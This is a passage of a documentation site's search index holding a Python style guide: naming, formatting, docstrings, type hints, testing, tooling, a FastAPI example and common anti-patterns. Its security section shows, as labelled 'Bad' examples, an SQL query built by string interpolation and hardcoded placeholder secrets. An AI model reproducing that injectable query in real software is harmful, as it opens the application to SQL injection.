<code>api_client.py</code> Short, lowercase, no hyphens Packages <code>snake_case</code> <code>data_utils/</code>, <code>auth_service/</code> Short, lowercase, avoid underscores if possible Private <code>_leading_underscore</code> <code>_internal_method()</code>, <code>_cache</code> Indicates internal use only Formatting Line Length 88 characters <code># Black default</code> Max 88 (Black), 79 (PEP 8) acceptable Indentation 4 spaces <code>if condition:</code> Never tabs, always 4 spaces Blank Lines 2 between top-level <code>class Foo:\\n\\n\\nclass Bar:</code> 2 blank lines between classes/functions String Quotes Double quotes <code>\"hello world\"</code> Prefer double, single for avoiding escapes Imports Order stdlib, 3rd-party, local <code>import os\\nimport boto3\\nfrom .utils import x</code> Alphabetical within each group Style Absolute imports <code>from myapp.utils import helper</code> Avoid relative imports except in packages Documentation Docstrings <code>\"\"\"Triple double quotes\"\"\"</code> <code>\"\"\"Returns user by ID.\"\"\"</code> All public modules, classes, functions Type Hints Required for functions <code>def foo(x: int) -&gt; str:</code> All function signatures Files Naming <code>snake_case.py</code> <code>user_service.py</code>, <code>__init__.py</code> Lowercase, underscores, <code>.py</code> extension Encoding UTF-8 <code># -*- coding: utf-8 -*-</code> Default, explicit if non-ASCII","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#naming-conventions","title":"Naming Conventions","text":"","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#variables","title":"Variables","text":"<p>Convention: <code>snake_case</code></p> <pre><code>## Good\nuser_count = 10\nmax_retry_attempts = 3\napi_response_data = fetch_data()\n\n## Bad\nUserCount = 10  # PascalCase for variables\nmaxRetryAttempts = 3  # camelCase\napiresponsedata = fetch_data()  # No separation\n</code></pre> <p>Guidelines:</p> <ul> <li>Use descriptive names that indicate purpose</li> <li>Avoid single-letter names except loop counters (<code>i</code>, <code>j</code>, <code>k</code>) and comprehensions</li> <li>Boolean variables should ask a question: <code>is_active</code>, <code>has_permission</code>, <code>should_retry</code></li> <li>Avoid abbreviations unless universally understood (<code>http</code>, <code>api</code>, <code>url</code>)</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#constants","title":"Constants","text":"<p>Convention: <code>UPPER_SNAKE_CASE</code></p> <pre><code>## Good\nMAX_CONNECTION_POOL_SIZE = 100\nAPI_BASE_URL = \"https://api.example.com\"\nDEFAULT_TIMEOUT_SECONDS = 30\n\n## Bad\nmax_connection_pool_size = 100  # Looks like a variable\nMaxConnectionPoolSize = 100  # Not a constant style\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#functions-and-methods","title":"Functions and Methods","text":"<p>Convention: <code>snake_case</code></p> <pre><code>## Good\ndef get_user_by_id(user_id: int) -&gt; User:\n    \"\"\"Retrieve user from database by ID.\"\"\"\n    return database.query(User).filter(User.id == user_id).first()\n\ndef calculate_monthly_cost(instances: List[Instance]) -&gt; Decimal:\n    \"\"\"Calculate total monthly cost for EC2 instances.\"\"\"\n    return sum(instance.hourly_rate * 730 for instance in instances)\n\n## Bad\ndef GetUserById(user_id: int):  # PascalCase\n    pass\n\ndef calcCost(inst):  # camelCase, abbreviations\n    pass\n</code></pre> <p>Guidelines:</p> <ul> <li>Use verb-noun format: <code>get_user()</code>, <code>calculate_total()</code>, <code>validate_input()</code></li> <li>Keep names concise but descriptive (avoid <code>process()</code>, <code>handle()</code>, <code>do_stuff()</code>)</li> <li>Private methods start with single underscore: <code>_internal_helper()</code></li> <li>Name-mangled methods start with double underscore: <code>__private_method()</code></li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#classes","title":"Classes","text":"<p>Convention: <code>PascalCase</code></p> <pre><code>## Good\nclass UserRepository:\n    \"\"\"Handles database operations for User entities.\"\"\"\n    pass\n\nclass AWSResourceManager:\n    \"\"\"Manages AWS resources lifecycle.\"\"\"\n    pass\n\nclass HTTPConnectionPool:\n    \"\"\"Pool of reusable HTTP connections.\"\"\"\n    pass\n\n## Bad\nclass user_repository:  # snake_case\n    pass\n\nclass awsResourceManager:  # camelCase\n    pass\n</code></pre> <p>Guidelines:</p> <ul> <li>Use noun phrases: <code>User</code>, <code>PaymentProcessor</code>, <code>ConfigValidator</code></li> <li>Exception classes end with <code>Error</code> or <code>Exception</code>: <code>ValidationError</code>, <code>ConfigurationException</code></li> <li>Abstract base classes can prefix with <code>Abstract</code> or <code>Base</code>: <code>AbstractRepository</code>, <code>BaseHandler</code></li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#files-and-modules","title":"Files and Modules","text":"<p>Convention: <code>snake_case.py</code></p> <pre><code>## Good\nuser_repository.py\naws_resource_manager.py\nhttp_client.py\n\n## Bad\nUserRepository.py  # PascalCase\nawsResourceManager.py  # camelCase\nhttpClient.py  # camelCase\n</code></pre> <p>Guidelines:</p> <ul> <li>Match file name to primary class when file contains single class: <code>user.py</code> contains <code>class User</code></li> <li>Use <code>__init__.py</code> for package initialization</li> <li>Test files: <code>test_&lt;module&gt;.py</code> or <code>&lt;module&gt;_test.py</code></li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#code-formatting","title":"Code Formatting","text":"","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#indentation","title":"Indentation","text":"<ul> <li>Style: Spaces only (no tabs)</li> <li>Size: 4 spaces per indentation level</li> </ul> <pre><code>## Good\ndef process_data(items):\n    for item in items:\n        if item.is_valid:\n            result = transform(item)\n            save(result)\n\n## Bad - 2 spaces\ndef process_data(items):\n  for item in items:\n    if item.is_valid:\n      result = transform(item)\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#line-length","title":"Line Length","text":"<ul> <li>Maximum: 88 characters (Black default) or 100 characters</li> <li>Exception: Long strings, URLs, import statements can exceed</li> </ul> <pre><code>## Good - line broken appropriately\nuser_data = database.query(User).filter(\n    User.is_active == True,\n    User.created_at &gt; start_date\n).all()\n\n## Good - long URL on its own line\nAPI_ENDPOINT = (\n    \"https://api.example.com/v2/resources/users/search?filter=active&amp;limit=100\"\n)\n\n## Bad - line too long\nuser_data = database.query(User).filter(User.is_active == True, User.created_at &gt; start_date, User.department == \"Engineering\").all()\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#blank-lines","title":"Blank Lines","text":"<ul> <li>Between top-level functions and classes: 2 blank lines</li> <li>Between methods in a class: 1 blank line</li> <li>Within functions: Use sparingly to separate logical blocks</li> <li>File end: Exactly 1 blank line</li> </ul> <pre><code>import os\n\ndef function_one():\n    \"\"\"First function.\"\"\"\n    pass\n\ndef function_two():\n    \"\"\"Second function.\"\"\"\n    pass\n\nclass MyClass:\n    \"\"\"Example class.\"\"\"\n\n    def method_one(self):\n        \"\"\"First method.\"\"\"\n        pass\n\n    def method_two(self):\n        \"\"\"Second method.\"\"\"\n        pass\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#imports","title":"Imports","text":"<p>Order: Standard library, third-party, local modules</p> <pre><code>## Good - organized imports\nimport os\nimport sys\nfrom pathlib import Path\n\nimport boto3\nimport requests\nfrom fastapi import FastAPI, HTTPException\n\nfrom app.models.user import User\nfrom app.services.auth import AuthService\nfrom app.utils.validators import validate_email\n\n## Bad - mixed order, grouped incorrectly\nfrom app.models.user import User\nimport requests\nimport os\nfrom fastapi import FastAPI\n</code></pre> <p>Guidelines:</p> <ul> <li>Use absolute imports for better clarity</li> <li>Group imports with blank lines between groups</li> <li>Use <code>isort</code> to automatically organize imports</li> <li>Avoid wildcard imports: <code>from module import *</code> (except in <code>__init__.py</code> when appropriate)</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#documentation-standards","title":"Documentation Standards","text":"","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#module-level-documentation","title":"Module-Level Documentation","text":"<p>Required for: All Python files</p> <pre><code>\"\"\"\n@module user_authentication\n@description Handles user authentication, session management, and JWT token generation\n@dependencies fastapi, pyjwt, passlib, python-dotenv\n@version 1.2.0\n@author Tyler Dukes\n@last_updated 2025-10-28\n@status stable\n@security_classification internal\n@python_version &gt;= 3.9\n\"\"\"\n\nimport jwt\nfrom fastapi import APIRouter, HTTPException\nfrom passlib.context import CryptContext\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#functionmethod-documentation","title":"Function/Method Documentation","text":"<p>Required for: All public functions and complex logic</p> <pre><code>def authenticate_user(username: str, password: str) -&gt; Optional[User]:\n    \"\"\"\n    Authenticate user credentials and return user object if valid.\n\n    Args:\n        username: User's username or email address\n        password: Plain text password to verify\n\n    Returns:\n        User object if authentication succeeds, None otherwise\n\n    Raises:\n        DatabaseError: If database connection fails\n        ValidationError: If username format is invalid\n\n    Example:\n        &gt;&gt;&gt; user = authenticate_user(\"john@example.com\", \"secret123\")\n        &gt;&gt;&gt; if user:\n        ...     print(f\"Welcome {user.name}\")\n    \"\"\"\n    if not validate_username(username):\n        raise ValidationError(\"Invalid username format\")\n\n    user = get_user_by_username(username)\n    if user and verify_password(password, user.password_hash):\n        return user\n    return None\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#type-hints","title":"Type Hints","text":"<p>Required for: All function signatures in production code</p> <pre><code>from typing import List, Dict, Optional, Union, Tuple\n\n## Good - comprehensive type hints\ndef get_active_users(\n    department: str,\n    limit: int = 100,\n    include_archived: bool = False\n) -&gt; List[User]:\n    \"\"\"Get list of active users from specified department.\"\"\"\n    pass\n\ndef parse_config(\n    config_path: Path\n) -&gt; Dict[str, Union[str, int, bool]]:\n    \"\"\"Parse configuration file and return settings dictionary.\"\"\"\n    pass\n\n## Bad - no type hints\ndef get_active_users(department, limit=100):\n    pass\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#error-handling","title":"Error Handling","text":"","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#exception-handling","title":"Exception Handling","text":"<p>Strategy: Fail-fast, raise specific exceptions, clean up resources</p> <pre><code>## Good - specific exceptions and cleanup\ndef fetch_remote_data(url: str) -&gt; Dict:\n    \"\"\"Fetch data from remote API with retry logic.\"\"\"\n    try:\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()\n        return response.json()\n    except requests.Timeout:\n        logger.error(f\"Timeout fetching data from {url}\")\n        raise APITimeoutError(f\"Request to {url} timed out\")\n    except requests.HTTPError as e:\n        logger.error(f\"HTTP error {e.response.status_code}: {url}\")\n        raise APIError(f\"Failed to fetch data: {e}\")\n    except ValueError:\n        logger.error(f\"Invalid JSON response from {url}\")\n        raise DataFormatError(\"Response is not valid JSON\")\n\n## Bad - catching generic Exception\ndef fetch_remote_data(url):\n    try:\n        response = requests.get(url)\n        return response.json()\n    except Exception:  # Too broad\n        pass  # Silent failure\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#custom-exceptions","title":"Custom Exceptions","text":"<pre><code>class APIError(Exception):\n    \"\"\"Base exception for API-related errors.\"\"\"\n    pass\n\nclass APITimeoutError(APIError):\n    \"\"\"Raised when API request times out.\"\"\"\n    pass\n\nclass DataFormatError(APIError):\n    \"\"\"Raised when API response has invalid format.\"\"\"\n    pass\n\n## Usage\ntry:\n    data = fetch_remote_data(\"https://api.example.com/users\")\nexcept APITimeoutError:\n    # Handle timeout specifically\n    use_cached_data()\nexcept APIError as e:\n    # Handle other API errors\n    logger.error(f\"API error: {e}\")\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#context-managers","title":"Context Managers","text":"<p>Use for: Resource cleanup (files, connections, locks)</p> <pre><code>## Good - guaranteed cleanup\nfrom contextlib import contextmanager\n\n@contextmanager\ndef database_session():\n    \"\"\"Context manager for database sessions.\"\"\"\n    session = Session()\n    try:\n        yield session\n        session.commit()\n    except Exception:\n        session.rollback()\n        raise\n    finally:\n        session.close()\n\n## Usage\nwith database_session() as session:\n    user = session.query(User).first()\n    user.last_login = datetime.now()\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#testing-requirements","title":"Testing Requirements","text":"","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#coverage-requirements","title":"Coverage Requirements","text":"<ul> <li>Unit Tests: 80%+ coverage for business logic</li> <li>Integration Tests: All API endpoints and external integrations</li> <li>Test Files: Located in <code>tests/</code> directory, mirror source structure</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#test-naming","title":"Test Naming","text":"<p>Convention: <code>test_should_&lt;behavior&gt;_when_&lt;condition&gt;</code></p> <pre><code>def test_should_return_user_when_valid_id_provided():\n    \"\"\"Test get_user_by_id returns user for valid ID.\"\"\"\n    user_id = 123\n    user = get_user_by_id(user_id)\n    assert user.id == user_id\n    assert user is not None\n\ndef test_should_raise_error_when_user_not_found():\n    \"\"\"Test get_user_by_id raises NotFoundError for invalid ID.\"\"\"\n    with pytest.raises(NotFoundError):\n        get_user_by_id(999999)\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#test-structure","title":"Test Structure","text":"<p>Pattern: Arrange-Act-Assert</p> <pre><code>import pytest\nfrom app.services.user_service import UserService\n\n@pytest.fixture\ndef user_service():\n    \"\"\"Fixture providing UserService instance.\"\"\"\n    return UserService(database_url=\"sqlite:///:memory:\")\n\ndef test_should_create_user_with_valid_data(user_service):\n    # Arrange\n    user_data = {\n        \"username\": \"john_doe\",\n        \"email\": \"john@example.com\",\n        \"password\": \"secure_password123\"\n    }\n\n    # Act\n    user = user_service.create_user(**user_data)\n\n    # Assert\n    assert user.username == \"john_doe\"\n    assert user.email == \"john@example.com\"\n    assert user.password != \"secure_password123\"  # Should be hashed\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#mocking","title":"Mocking","text":"<pre><code>from unittest.mock import Mock, patch, MagicMock\n\n## Good - mock external dependencies\n@patch('app.services.email.send_email')\ndef test_should_send_welcome_email_after_signup(mock_send_email):\n    \"\"\"Test welcome email is sent after user signup.\"\"\"\n    user_service = UserService()\n    user = user_service.signup(\"john@example.com\", \"password123\")\n\n    mock_send_email.assert_called_once_with(\n        to=user.email,\n        subject=\"Welcome!\",\n        template=\"welcome\"\n    )\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#security-best-practices","title":"Security Best Practices","text":"","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#input-validation","title":"Input Validation","text":"<pre><code>from pydantic import BaseModel, EmailStr, validator\n\nclass UserCreate(BaseModel):\n    \"\"\"Validated user creation request.\"\"\"\n    username: str\n    email: EmailStr\n    password: str\n\n    @validator('username')\n    def username_alphanumeric(cls, v):\n        \"\"\"Ensure username is alphanumeric.\"\"\"\n        if not v.isalnum():\n            raise ValueError('Username must be alphanumeric')\n        return v\n\n    @validator('password')\n    def password_strength(cls, v):\n        \"\"\"Ensure password meets minimum requirements.\"\"\"\n        if len(v) &lt; 8:\n            raise ValueError('Password must be at least 8 characters')\n        return v\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#sql-injection-prevention","title":"SQL Injection Prevention","text":"<pre><code>## Good - parameterized queries\nfrom sqlalchemy import text\n\ndef get_user_by_email(email: str) -&gt; Optional[User]:\n    \"\"\"Get user by email using parameterized query.\"\"\"\n    query = text(\"SELECT * FROM users WHERE email = :email\")\n    result = db.execute(query, {\"email\": email})\n    return result.first()\n\n## Bad - string concatenation (NEVER DO THIS)\ndef get_user_by_email(email: str):\n    query = f\"SELECT * FROM users WHERE email = '{email}'\"  # Vulnerable!\n    return db.execute(query)\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#secret-management","title":"Secret Management","text":"<pre><code>import os\nfrom functools import lru_cache\n\n## Good - environment variables\n@lru_cache()\ndef get_settings():\n    \"\"\"Get application settings from environment.\"\"\"\n    return {\n        \"database_url\": os.getenv(\"DATABASE_URL\"),\n        \"api_key\": os.getenv(\"API_KEY\"),\n        \"secret_key\": os.getenv(\"SECRET_KEY\")\n    }\n\n## Bad - hardcoded secrets (NEVER DO THIS)\nDATABASE_URL = \"postgresql://user:password@localhost/db\"  # Exposed!\nAPI_KEY = \"sk_live_abc123xyz...\"  # Committed to git!\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#recommended-tools","title":"Recommended Tools","text":"","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#formatters","title":"Formatters","text":"<ul> <li>Black: Opinionated code formatter</li> <li>Installation: <code>pip install black</code></li> <li>Configuration: <code>pyproject.toml</code></li> <li> <p>Run: <code>black .</code></p> </li> <li> <p>isort: Import statement organizer</p> </li> <li>Installation: <code>pip install isort</code></li> <li>Run: <code>isort .</code></li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#linters","title":"Linters","text":"<ul> <li>Flake8: Style guide enforcement</li> <li>Installation: <code>pip install flake8</code></li> <li>Configuration: <code>.flake8</code> or <code>setup.cfg</code></li> <li> <p>Run: <code>flake8 .</code></p> </li> <li> <p>Pylint: Comprehensive code analysis</p> </li> <li>Installation: <code>pip install pylint</code></li> <li>Run: <code>pylint src/</code></li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#type-checkers","title":"Type Checkers","text":"<ul> <li>mypy: Static type checker</li> <li>Installation: <code>pip install mypy</code></li> <li>Configuration: <code>mypy.ini</code></li> <li>Run: <code>mypy src/</code></li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#testing","title":"Testing","text":"<ul> <li>pytest: Testing framework</li> <li>Installation: <code>pip install pytest pytest-cov</code></li> <li>Run: <code>pytest --cov=src tests/</code></li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#pre-commit-configuration","title":"Pre-commit Configuration","text":"<pre><code>## .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/psf/black\n    rev: 24.10.0\n    hooks:\n      - id: black\n        language_version: python3.11\n\n  - repo: https://github.com/pycqa/isort\n    rev: 5.13.2\n    hooks:\n      - id: isort\n        args: [\"--profile\", \"black\"]\n\n  - repo: https://github.com/pycqa/flake8\n    rev: 7.1.1\n    hooks:\n      - id: flake8\n        args: [\"--max-line-length=88\", \"--extend-ignore=E203\"]\n\n  - repo: https://github.com/pre-commit/mirrors-mypy\n    rev: v1.11.2\n    hooks:\n      - id: mypy\n        additional_dependencies: [types-requests]\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#complete-example","title":"Complete Example","text":"","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#fastapi-application-with-best-practices","title":"FastAPI Application with Best Practices","text":"<pre><code>\"\"\"\n@module user_api\n@description RESTful API for user management with authentication\n@dependencies fastapi, pydantic, sqlalchemy, python-jose\n@version 1.0.0\n@author Tyler Dukes\n@last_updated 2025-10-28\n@status stable\n@api_endpoints POST /users, GET /users/{id}, PUT /users/{id}, DELETE /users/{id}\n\"\"\"\n\nfrom typing import List, Optional\nfrom datetime import datetime\n\nfrom fastapi import FastAPI, HTTPException, Depends, status\nfrom pydantic import BaseModel, EmailStr\nfrom sqlalchemy.orm import Session\n\nfrom app.database import get_db\nfrom app.models.user import User\nfrom app.services.auth import get_current_user\n\napp = FastAPI(title=\"User Management API\")\n\nclass UserCreate(BaseModel):\n    \"\"\"Schema for user creation.\"\"\"\n    username: str\n    email: EmailStr\n    password: str\n\nclass UserResponse(BaseModel):\n    \"\"\"Schema for user response.\"\"\"\n    id: int\n    username: str\n    email: EmailStr\n    created_at: datetime\n\n    class Config:\n        \"\"\"Pydantic configuration.\"\"\"\n        from_attributes = True\n\n@app.post(\"/users\", response_model=UserResponse, status_code=status.HTTP_201_CREATED)\ndef create_user(\n    user_data: UserCreate,\n    db: Session = Depends(get_db)\n) -&gt; UserResponse:\n    \"\"\"\n    Create new user account.\n\n    Args:\n        user_data: User creation data\n        db: Database session\n\n    Returns:\n        Created user information\n\n    Raises:\n        HTTPException: If username or email already exists\n    \"\"\"\n    # Check for existing user\n    existing_user = db.query(User).filter(\n        (User.username == user_data.username) | (User.email == user_data.email)\n    ).first()\n\n    if existing_user:\n        raise HTTPException(\n            status_code=status.HTTP_409_CONFLICT,\n            detail=\"Username or email already exists\"\n        )\n\n    # Create new user\n    user = User(\n        username=user_data.username,\n        email=user_data.email,\n        password_hash=hash_password(user_data.password),\n        created_at=datetime.utcnow()\n    )\n\n    db.add(user)\n    db.commit()\n    db.refresh(user)\n\n    return user\n\n@app.get(\"/users/{user_id}\", response_model=UserResponse)\ndef get_user(\n    user_id: int,\n    db: Session = Depends(get_db),\n    current_user: User = Depends(get_current_user)\n) -&gt; UserResponse:\n    \"\"\"\n    Get user by ID (requires authentication).\n\n    Args:\n        user_id: User ID to retrieve\n        db: Database session\n        current_user: Authenticated user\n\n    Returns:\n        User information\n\n    Raises:\n        HTTPException: If user not found\n    \"\"\"\n    user = db.query(User).filter(User.id == user_id).first()\n\n    if not user:\n        raise HTTPException(\n            status_code=status.HTTP_404_NOT_FOUND,\n            detail=f\"User {user_id} not found\"\n        )\n\n    return user\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#anti-patterns","title":"Anti-Patterns","text":"","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#mutable-default-arguments","title":"Mutable Default Arguments","text":"<p>Problem: Using mutable objects (lists, dicts) as default arguments causes unexpected behavior.</p> <p>Bad:</p> <pre><code>def add_item(item, items=[]):  # \u274c Mutable default\n    items.append(item)\n    return items\n\n## Unexpected behavior\nlist1 = add_item(\"a\")  # [\"a\"]\nlist2 = add_item(\"b\")  # [\"a\", \"b\"] - unexpected!\n</code></pre> <p>Good:</p> <pre><code>def add_item(item, items=None):  # \u2705 Use None as default\n    if items is None:\n        items = []\n    items.append(item)\n    return items\n\n## Expected behavior\nlist1 = add_item(\"a\")  # [\"a\"]\nlist2 = add_item(\"b\")  # [\"b\"] - correct!\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#bare-except-clauses","title":"Bare Except Clauses","text":"<p>Problem: Catching all exceptions hides bugs and makes debugging impossible.</p> <p>Bad:</p> <pre><code>def process_data(data):\n    try:\n        result = complex_operation(data)\n        return result\n    except:  # \u274c Catches everything, including KeyboardInterrupt!\n        return None\n</code></pre> <p>Good:</p> <pre><code>def process_data(data):\n    try:\n        result = complex_operation(data)\n        return result\n    except (ValueError, TypeError) as e:  # \u2705 Catch specific exceptions\n        logger.error(f\"Failed to process data: {e}\")\n        return None\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#string-formatting-with-or-format","title":"String Formatting with % or format()","text":"<p>Problem: Old-style string formatting is less readable and more error-prone.</p> <p>Bad:</p> <pre><code>## Old % formatting\nmessage = \"User %s has %d points\" % (username, points)  # \u274c Hard to read\n\n## Old .format()\nmessage = \"User {} has {} points\".format(username, points)  # \u274c Positional\n</code></pre> <p>Good:</p> <pre><code>## f-strings (Python 3.6+)\nmessage = f\"User {username} has {points} points\"  # \u2705 Clear and concise\n\n## With expressions\nmessage = f\"User {username} has {points * 2} bonus points\"  # \u2705 Powerful\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#missing-type-hints","title":"Missing Type Hints","text":"<p>Problem: Without type hints, IDEs can't help with autocomplete and type checking.</p> <p>Bad:</p> <pre><code>def calculate_total(items):  # \u274c No type information\n    return sum(item['price'] for item in items)\n</code></pre> <p>Good:</p> <pre><code>from typing import List, Dict, Any\n\ndef calculate_total(items: List[Dict[str, Any]]) -&gt; float:  # \u2705 Clear types\n    \"\"\"Calculate total price from list of items.\"\"\"\n    return sum(float(item['price']) for item in items)\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#using-global-variables","title":"Using Global Variables","text":"<p>Problem: Global variables make code hard to test and reason about.</p> <p>Bad:</p> <pre><code>## Module level\nuser_cache = {}  # \u274c Global mutable state\n\ndef get_user(user_id):\n    if user_id in user_cache:\n        return user_cache[user_id]\n    user = fetch_user(user_id)\n    user_cache[user_id] = user\n    return user\n</code></pre> <p>Good:</p> <pre><code>class UserCache:  # \u2705 Encapsulated state\n    def __init__(self):\n        self._cache: Dict[int, User] = {}\n\n    def get_user(self, user_id: int) -&gt; User:\n        if user_id in self._cache:\n            return self._cache[user_id]\n        user = self._fetch_user(user_id)\n        self._cache[user_id] = user\n        return user\n\n    def _fetch_user(self, user_id: int) -&gt; User:\n        # Implementation\n        pass\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#not-using-context-managers","title":"Not Using Context Managers","text":"<p>Problem: Manual resource management leads to resource leaks.</p> <p>Bad:</p> <pre><code>def read_config():\n    file = open(\"config.json\")  # \u274c No guarantee file will be closed\n    data = json.load(file)\n    file.close()  # May not execute if exception occurs\n    return data\n</code></pre> <p>Good:</p> <pre><code>def read_config():\n    with open(\"config.json\") as file:  # \u2705 Automatically closed\n        return json.load(file)\n\n## Or for multiple resources\ndef process_files(input_file, output_file):\n    with open(input_file) as infile, open(output_file, 'w') as outfile:\n        for line in infile:\n            outfile.write(line.upper())\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#checking-for-empty-containers-with-len","title":"Checking for Empty Containers with len()","text":"<p>Problem: Using <code>len()</code> to check if a container is empty is unnecessarily verbose.</p> <p>Bad:</p> <pre><code>if len(items) == 0:  # \u274c Verbose\n    print(\"No items\")\n\nif len(users) &gt; 0:  # \u274c Unnecessary\n    process_users(users)\n</code></pre> <p>Good:</p> <pre><code>if not items:  # \u2705 Pythonic and clear\n    print(\"No items\")\n\nif users:  # \u2705 Direct boolean context\n    process_users(users)\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#ignoring-list-comprehensions","title":"Ignoring List Comprehensions","text":"<p>Problem: Using loops for simple transformations is less readable and slower.</p> <p>Bad:</p> <pre><code>## Creating a new list\nsquares = []  # \u274c Verbose\nfor x in range(10):\n    squares.append(x**2)\n\n## Filtering\nevens = []  # \u274c Multiple lines\nfor x in range(10):\n    if x % 2 == 0:\n        evens.append(x)\n</code></pre> <p>Good:</p> <pre><code>## Creating a new list\nsquares = [x**2 for x in range(10)]  # \u2705 Concise\n\n## Filtering\nevens = [x for x in range(10) if x % 2 == 0]  # \u2705 Clear intent\n\n## With transformation and filtering\nupper_names = [name.upper() for name in names if len(name) &gt; 3]  # \u2705 Powerful\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#not-using-enumerate","title":"Not Using enumerate()","text":"<p>Problem: Manual index tracking is error-prone and not Pythonic.</p> <p>Bad:</p> <pre><code>items = [\"apple\", \"banana\", \"cherry\"]\nindex = 0  # \u274c Manual index management\nfor item in items:\n    print(f\"{index}: {item}\")\n    index += 1\n</code></pre> <p>Good:</p> <pre><code>items = [\"apple\", \"banana\", \"cherry\"]\nfor index, item in enumerate(items):  # \u2705 Built-in enumeration\n    print(f\"{index}: {item}\")\n\n## With custom start index\nfor index, item in enumerate(items, start=1):  # \u2705 Start from 1\n    print(f\"{index}: {item}\")\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#string-concatenation-in-loops","title":"String Concatenation in Loops","text":"<p>Problem: Concatenating strings in loops creates many intermediate objects.</p> <p>Bad:</p> <pre><code>result = \"\"  # \u274c Inefficient\nfor word in words:\n    result += word + \" \"\n</code></pre> <p>Good:</p> <pre><code>## For simple joining\nresult = \" \".join(words)  # \u2705 Efficient and clear\n\n## For complex building\nparts = []  # \u2705 Build list first\nfor word in words:\n    parts.append(f\"&lt;item&gt;{word}&lt;/item&gt;\")\nresult = \"\".join(parts)\n</code></pre>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#references","title":"References","text":"","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#official-documentation","title":"Official Documentation","text":"<ul> <li>Python Official Docs</li> <li>PEP 8 \u2013 Style Guide for Python Code</li> <li>PEP 484 \u2013 Type Hints</li> <li>PEP 257 \u2013 Docstring Conventions</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#community-style-guides","title":"Community Style Guides","text":"<ul> <li>Google Python Style Guide</li> <li>The Hitchhiker's Guide to Python</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#tools-documentation","title":"Tools Documentation","text":"<ul> <li>Black Code Formatter</li> <li>Flake8 Linter</li> <li>mypy Type Checker</li> <li>pytest Testing Framework</li> 